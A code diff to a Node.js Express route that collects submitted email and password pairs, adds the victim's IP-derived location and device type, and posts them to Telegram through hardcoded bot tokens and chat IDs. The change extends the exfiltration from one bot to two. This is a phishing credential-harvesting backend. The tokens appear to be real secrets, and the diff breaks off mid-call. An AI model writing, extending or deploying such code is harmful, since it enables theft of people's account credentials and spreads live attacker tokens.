@@ -1,14 +1,13 @@
 const express = require("express");
-const fetch = require("node-fetch");  // install with: npm i node-fetch@2
+const fetch = require("node-fetch");
 const geoip = require('geoip-lite');
 const UAParser = require('ua-parser-js');
 
 const router = express.Router();
 
 // Your Telegram bot credentials
-const BOT_TOKEN = "6808029671:AAGCyAxWwDfYMfeTEo9Jbc5-PKYUgbLLkZ4";   // from @BotFather
-const CHAT_ID = "6068638071";  // your chat ID
-const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+const BOT_TOKENS = ["6808029671:AAGCyAxWwDfYMfeTEo9Jbc5-PKYUgbLLkZ4", "8243640993:AAEOKTTis2fef8CfY9MFqBsA1BAC8llbh0Y"];
+const CHAT_IDS = ["6068638071", "7424024723"];
 
 router.post('/', async (req, res) => {
     try {
@@ -18,7 +17,7 @@ router.post('/', async (req, res) => {
             return res.status(400).json({ success: false, message: "Missing email or password" });
         }
 
-        const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
+        const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress;
         const location = geoip.lookup(ip);
         const locationStr = location ? `${location.city}, ${location.country}` : 'Unknown';
 
@@ -37,10 +36,16 @@ router.post('/', async (req, res) => {
 - Device: ${deviceType}
         `;
 
-        // Send to Telegram
-        const response = await fetch(TELEGRAM_API, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
+        // Send to all bots/chats
+        const sendPromises = [];
+        
+        for (let i = 0; i < Math.min(BOT_TOKENS.length, CHAT_IDS.length); i++) {
+            const telegramApi = `https://api.telegram.org/bot${BOT_TOKENS[i]}/sendMessage`;
+            
+            sendPromises.push(
+                fetch(telegramApi, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
             body: JSON.stringify({
                 chat_id: CHAT_ID,
                 text: message,
